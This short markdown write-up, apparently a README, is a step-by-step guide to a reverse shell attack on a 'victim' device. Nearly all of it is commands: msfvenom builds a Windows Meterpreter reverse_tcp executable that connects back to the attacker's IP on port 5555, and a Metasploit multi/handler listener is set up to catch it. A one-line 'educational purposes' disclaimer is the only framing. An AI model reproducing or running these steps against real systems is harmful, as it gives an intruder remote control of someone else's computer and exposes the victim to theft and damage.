# How to do a reverse shell attack

Write-up of how to do a reverse shell attack to any type of device, but Apple devices.

**¡¡DISCLAIMER:** 
		**I'm doing this only for educational purposes.**
		**I'm not responsible of any illegal uses.**
		**The bad use of this Write-up may cause damage to the victim!!**

Before starting, we need to get our victim's IP to do this type of attack
1. **Check if the victim's IP is up.**
	```
	ping [IP]
 	```

3. **Create a folder with a basic name and get into that folder.**
	```
	mkdir [folder-name] && cd [folder-name]
	```


5. **On the folder created previously execute the command below:**
	```
 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR-IP] LPORT=5555 -f exe > path/to/the/folder/of/step/2/[name].exe
	```


7. **Open metasploit and execute this command:** 
	```
	use exploit/multi/handler
 	```


9. **Once executed the previous command, set-up the payload, in this case meterpreter -- reverse_tcp, for that execute the command below:**
	```
 	set payload windows/meterpreter/reverse_tcp
	```


11. **When the command before get executed, introduce the necessary data to create the reverse shell connection, in this case these are the commands:**
	```
 	set LHOST (YOUR IP)
	set LPORT 5555
 	```


13. **Finally, execute the command below to start listening to possible reverse  shell connections.**
	```
	exploit
 	```

